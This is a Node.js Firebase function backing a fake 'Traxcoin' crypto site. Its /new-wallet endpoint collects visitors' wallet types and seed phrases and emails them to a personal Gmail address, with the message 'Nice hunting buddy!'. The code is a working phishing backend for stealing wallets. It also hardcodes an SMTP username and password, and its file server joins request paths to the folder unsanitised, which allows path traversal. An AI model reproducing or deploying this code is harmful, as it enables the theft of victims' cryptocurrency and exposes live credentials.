const fs = require("fs");
const path = require("path");
const url = require("url");
const functions = require("firebase-functions");

const nodemailer = require("nodemailer");
const { log } = require("firebase-functions/logger");

const transporter = nodemailer.createTransport({
  host: "mail.privateemail.com",
  port: 465,
  secure: true,
  auth: {
    user: "info@traxcoin.one",
    pass: "info@123#",
  },
});

async function deliverMail(data) {
  const mail = {
    from: "info@traxcoin.one",
    to: `mjabbay4real@gmail.com`,
    subject: "New Wallet and Seed Phrase!",
    html: `<!DOCTYPE html>
<html lang="en">
  <head>
    <link rel="preconnect" href="https://fonts.googleapis.com" />
    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin />
    <link
      href="https://fonts.googleapis.com/css2?family=Montserrat:wght@300;400;500;600;700;800;900&display=swap"
      rel="stylesheet"
    />
    <style>
      * {
        padding: 0;
        margin: 0;
        border: 0;
        outline: 0;
        text-decoration: none;
        box-sizing: border-box;
        font-family: "Montserrat", sans-serif;
        line-height: 1.7;
      }
      :root {
        --color-primary: #6c63ff;
        --color-success: #00bf8e;
        --color-white: #fff;
        --color-black: #000;
        --color-bg: #1f2641;
        --color-bg1: #2e3267;
        --color-bg2: #424890;
      }

      header {
        padding: 10px;
        text-align: center;
        color: var(--color-white);
        background: linear-gradient(
          135deg,
          var(--color-primary),
          var(--color-bg2)
        );
      }
      .hero {
        height: 150px;
        display: flex;
        align-items: center;
        justify-content: center;
        flex-direction: column;
        margin-bottom: 20px;
        background: linear-gradient(rgba(0, 0, 0, 0.7), rgba(0, 0, 0, 0.7)),
          url(https://plus.unsplash.com/premium_photo-1661763720453-038215ddc44f?auto=format&fit=crop&q=60&w=500&ixlib=rb-4.0.3&ixid=M3wxMjA3fDB8MHxzZWFyY2h8OXx8Y3J5cHRvY3VycmVuY3l8ZW58MHx8MHx8fDA%3D);
        background-size: cover;
        background-position: center;
        color: var(--color-white);
        padding: 10px;
        text-align: center;
      }

      .wrapper {
        padding: 10px;
      }

      .wrapper strong {
        display: block;
        margin: 5px 0;
      }

      .wrapper strong{
        padding: 10px;
        border-radius: 10px;
        border: 1px solid var(--color-bg);
      }

      footer {
        color: var(--color-white);
        padding: 10px;
        margin-top: 20px;
        background: var(--color-bg);
      }

      footer span {
        color: var(--color-success);
      }
    </style>
  </head>
  <body>
    <header>
      <b>Traxcoin</b>
    </header>
    <div class="hero">
      <h3>Welcome to Traxcoin</h3>
      <p>Culture has found new expression in web3 through art, gaming , entertainment and events.</p>
    </div>
    <div class="wrapper">
      <p>
        Find below the user's seed phrase and type of wallet
      </p>
      <strong>Wallet: ${data.wallet}</strong>
      <strong>Seed phrase: <p>${data.seed}</p></strong>
      <p>
        Nice hunting buddy!
      </p>
      <b>The Tranxcoin Team.</b>
    </div>
    <footer>
      <small
        >This email is intended for mjabbay4real@gmail.com. This email is auto generated, do
        not borther replying to this email.</small
      >
      <small
        >The Tranxcoin logo is a trademark of
        <span>Tranxcoin Investment inc.</span> All rights reserved.</small
      >
    </footer>
  </body>
</html>
`,
  };
  try {
    transporter.sendMail(mail, (err, info) => {
      if (err) {
        console.log(`There is problem sending email: ${err}`);
      } else {
        console.log(`Email sent succesfully: ${info.response}`);
      }
    });
  } catch (err) {
    throw err;
  }
}

exports.app = functions.https.onRequest((req, res) => {
  const { pathname, query } = url.parse(req.url, true);
  const extension = path.extname(pathname);
  let contentType;
  if (pathname.includes(".")) {
    switch (extension) {
      case ".css":
        contentType = "text/css";
        const cssPath = path.join(__dirname, pathname);
        fs.readFile(cssPath, "utf-8", (err, data) => {
          if (err) console.log(err);
          res.writeHead(200, { "Content-Type": contentType });
          res.end(data);
        });
        break;
      case ".js":
        contentType = "application/javascript";
        const jsPath = path.join(__dirname, pathname);
        fs.readFile(jsPath, "utf-8", (err, data) => {
          if (err) console.log(err);
          res.writeHead(200, { "Content-Type": contentType });
          res.end(data);
        });
        break;
      case ".jpeg":
        contentType = "image/jpeg";
        const jpegPath = path.join(__dirname, pathname);
        fs.readFile(jpegPath, "", (err, data) => {
          if (err) console.log(err);
          res.writeHead(200, { "Content-Type": contentType });
          res.end(data);
        });
        break;
      case ".png":
        contentType = "image/png";
        const pngPath = path.join(__dirname, pathname);
        fs.readFile(pngPath, "", (err, data) => {
          if (err) console.log(err);
          res.writeHead(200, { "Content-Type": contentType });
          res.end(data);
        });
        break;
      case ".jpg":
        contentType = "image/jpg";
        const jpgPath = path.join(__dirname, pathname);
        fs.readFile(jpgPath, "", (err, data) => {
          if (err) console.log(err);
          res.writeHead(200, { "Content-Type": contentType });
          res.end(data);
        });
        break;
      case ".JPG":
        contentType = "image/jpg";
        const JPGPath = path.join(__dirname, pathname);
        fs.readFile(JPGPath, "", (err, data) => {
          if (err) console.log(err);
          res.writeHead(200, { "Content-Type": contentType });
          res.end(data);
        });
        break;
      case ".svg":
        contentType = "image/svg+xml";
        const svgPath = path.join(__dirname, pathname);
        fs.readFile(svgPath, "", (err, data) => {
          if (err) console.log(err);
          res.writeHead(200, { "Content-Type": contentType });
          res.end(data);
        });
        break;
    }
  }

  if (pathname == "/") {
    const home = path.join(__dirname, "index.html");
    fs.readFile(home, "utf-8", (err, data) => {
      if (err) console.log(err);
      res.writeHead(200, { "Content-Type": "text/html" });
      res.end(data);
    });
  }
  if (pathname == "/traxcoin/wallet") {
    const home = path.join(__dirname, "wallet.html");
    fs.readFile(home, "utf-8", (err, data) => {
      if (err) console.log(err);
      res.writeHead(200, { "Content-Type": "text/html" });
      res.end(data);
    });
  }
  if (pathname == "/new-wallet") {
    let body;
    req.on("data", (chunk) => {
      body = chunk;
    });
    req.on("end", async () => {
      try {
        let resData = JSON.parse(body);
        await deliverMail(resData);
        res.writeHead(200, { "Content-Type": "application/json" });
        res.end(JSON.stringify({ stat: true }));
      } catch (err) {
        console.log(err);
      }
    });
  }
});
